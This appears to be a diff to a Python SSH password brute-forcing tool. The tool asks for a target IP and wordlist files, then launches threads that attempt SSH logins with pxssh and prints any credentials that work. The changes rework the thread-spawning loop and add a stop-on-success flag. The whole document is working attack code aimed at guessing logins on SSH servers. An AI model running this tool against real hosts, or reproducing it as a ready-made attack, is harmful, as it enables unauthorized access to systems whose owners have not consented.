@@ -23,8 +23,6 @@ class Main():
                                  ░                                      
         """)
 
-        self.checked = 0
-        self.fails = 0
         print(f"{Fore.BLUE}1. Use a wordlist for both unames and passwords\n2. Use seperated unames list and password list:\n3. Use Uname:Pass File (Sperated by ':')\n")
         self.op = input(':')
         self.verbose = input('\n\n[CONSLOE] Print failes: ')
@@ -32,20 +30,27 @@ class Main():
         self.timeout = float(input('[CONSLOE] Timeout between each check (0.1-2): '))
         self.target = input('[CONSLOE] Please enter target ip: ')
 
+        self.found = False
+        self.yes = ["yes", "y", "ye", "Y", "YES", 'YE']
+        self.checked = 0
+        self.fails = 0
 
     def connect(self, host, uname, password):
-        self.checked += 1
-        uname = uname.replace("\n", "")
-        password = password.replace("\n", "")
         try:
+            uname = uname.replace("\n", "")
+            password = password.replace("\n", "")
             s = pxssh.pxssh()
             s.login(host, uname, password)
-            print(f'{Fore.GREEN} Password Found {uname} {password}')
+            print(f'{Fore.GREEN} Password Found! {uname} {password}')
+            self.found = True
             
         except pxssh.ExceptionPxssh:
             self.fails += 1
-            if self.verbose == 'y':
+            if self.verbose in self.yes:
                 print(f'{Fore.RED}Password inccorect! {uname}, {password}')
+
+        except Exception as e:
+            print(e)
 
 
     def extract(self, path):
@@ -65,57 +70,66 @@ class Main():
     def start(self):
         threads = []
         if self.op == '1':
-            subprocess.call('clear', shell=True)
-            path = input('Wordlist path: ')
-            f = open(path, 'r+', encoding='utf-8')
+            path = input('\nWordlist path: ')
+            wordlist = [word for word in open(path, 'r+', encoding='utf-8')]
 
-            for _ in range(self.thr):
-                if self.checked < len(f.readlines()):
+            while True:
+                if self.found == False:
+                    if threading.active_count() < int(self.thr):
+                        if self.checked < len(wordlist):
+                            t = threading.Thread(target= self.connect, args=[self.target, wordlist[self.checked], wordlist[self.checked]])
+                            t.start()
+                            self.checked += 1
 
-                    for i in open(path, 'r+', encoding='utf-8'):
-                        time.sleep(self.timeout)
-                        t = threading.Thread(target= self.connect, args=[self.target, i, i])
-                        t.start()
+                        elif self.checked >= len(wordlist):
+                            for t in threads:
+                                t.join()
 
-                elif self.checked >= len(f.readlines()):
+                elif self.found == True:
                     for t in threads:
                         t.join()
 
-
         elif self.op == '2':
-            subprocess.call('clear', shell=True)
-            path1 = input('User list path: ')
+            path1 = input('\nUser list path: ')
             path2 = input('Password list path: ')
             users = [user for user in open(path1, "r+", encoding='utf-8')]
             passwords = [password for password in open(path2, "r+", encoding='utf-8')]
 
-            for _ in range(self.thr):
-                if self.checked < len(users):
+            while True:
+                if self.found == False:
+                    if threading.active_count() < int(self.thr):
+                        if self.checked < len(users):
+                            t = threading.Thread(target= self.connect, args=[self.target, users[self.checked], passwords[self.checked]])
+                            t.start()
+                            self.checked += 1
 
-                    for i in range(0, len(users)):
-                        time.sleep(self.timeout)
-                        t = threading.Thread(target= self.connect, args=[self.target, users[i], passwords[i]])
-                        t.start()
+                        elif self.checked >= len(users):
+                            for t in threads:
+                                t.join()
 
-                elif self.checked >= len(users):
+                elif self.found == True:
                     for t in threads:
                         t.join()
 
         elif self.op == '3':
             subprocess.call('clear', shell=True)
-            path = input('UserPass file path: ')
+            path = input('\nUserPass file path: ')
             File = open(path, 'r+', encoding='utf-8')
             users, passwords = self.extract(File)
 
-            for _ in range(self.thr):
-                if self.checked < len(users):
-                    
-                    for i in range(0, len(users)):
-                        time.sleep(self.timeout)
-                        t = threading.Thread(target= self.connect, args=[self.target, users[i], passwords[i]])
-                        t.start()
+            while True:
+                if self.found == False:
+                    if threading.active_count() < int(self.thr):
+                        if self.checked < len(users):
+                            t = threading.Thread(target= self.connect, args=[self.target, users[self.checked], passwords[self.checked]])
+                            t.start()
+                            self.checked += 1
 
-                elif self.checked >= len(users):
+                        elif self.checked >= len(users):
+                            for t in threads:
+                                t.join()
+
+                elif self.found == True:
                     for t in threads:
                         t.join()
-            
+        return
